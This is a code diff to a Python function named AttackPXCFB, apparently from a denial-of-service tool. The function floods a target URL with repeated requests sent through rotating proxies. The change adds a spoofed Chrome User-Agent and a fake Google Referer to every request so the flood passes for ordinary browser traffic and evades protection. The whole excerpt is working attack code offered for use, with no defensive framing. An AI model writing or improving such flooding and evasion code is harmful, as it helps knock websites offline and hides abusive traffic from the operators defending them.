@@ -535,12 +535,15 @@ def AttackPXCFB(url, until_datetime, scraper):
                 proxies = {
                 'http': proxy_url,
                 }
-             
-                print(scraper.get(url, proxies=proxies),proxy_url)
-                print(scraper.get(url, proxies=proxies),proxy_url)
-                print(scraper.get(url, proxies=proxies),proxy_url)
-                print(scraper.get(url, proxies=proxies),proxy_url)
-                print(scraper.get(url, proxies=proxies),proxy_url)
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+                    'Referer': 'https://google.com'
+                }
+                print(scraper.get(url,headers=headers, proxies=proxies),proxy_url)
+                print(scraper.get(url,headers=headers, proxies=proxies),proxy_url)
+                print(scraper.get(url,headers=headers, proxies=proxies),proxy_url)
+                print(scraper.get(url,headers=headers, proxies=proxies),proxy_url)
+                print(scraper.get(url,headers=headers, proxies=proxies),proxy_url)
         except Exception as e:
             print('falid--------------',e)
             pass
